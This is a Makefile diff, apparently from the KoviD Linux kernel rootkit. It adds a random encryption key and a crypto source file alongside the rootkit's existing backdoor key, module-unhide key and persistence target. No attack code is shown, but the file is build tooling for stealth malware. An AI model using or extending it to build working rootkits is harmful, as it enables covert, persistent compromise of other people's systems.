@@ -14,16 +14,21 @@ UUIDGEN := $(shell uuidgen)
 BDKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
 UNHIDEKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
 
+# AES-256 key
+ENCKEY := $(shell echo "$$(od -vAn -N16 -tx8 < /dev/urandom | tr -d ' \n')")
+ENCKEY_LEN=32
+
 # PROCNAME, /proc/<name> interface.
 COMPILER_OPTIONS := -Wall -DPROCNAME='"$(PROCNAME)"' \
 	-DMODNAME='"kovid"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK -DPRCTIMEOUT=1200 \
 	-DPROCNAME_MAXLEN=256 -DCPUHACK -DPRCTIMEOUT=1200 \
-	-DUUIDGEN=\"$(UUIDGEN)\" -DJOURNALCTL=\"$(JOURNALCTL)\"
+	-DUUIDGEN=\"$(UUIDGEN)\" -DJOURNALCTL=\"$(JOURNALCTL)\" \
+	-DENCKEY=\"$(ENCKEY)\" -DENCKEY_LEN=$(ENCKEY_LEN)
 
 EXTRA_CFLAGS := -I$(src)/src -I$(src)/fs ${COMPILER_OPTIONS}
 
 SRC := src/${OBJNAME}.c src/pid.c src/fs.c src/sys.c \
-	src/sock.c src/util.c src/vm.c
+	src/sock.c src/util.c src/vm.c src/crypto.c
 
 persist=src/persist
 
@@ -45,6 +50,8 @@ all: persist
 	@echo $(BDKEY) | sed 's/^0x//'
 	@echo -n "Save this LKM unhide KEY: "
 	@echo $(UNHIDEKEY) | sed 's/^0x//'
+	@echo -n "Encryption KEY: "
+	@echo $(ENCKEY) | sed 's/^0x//'
 	@echo PROCNAME=$(PROCNAME)
 
 persist:
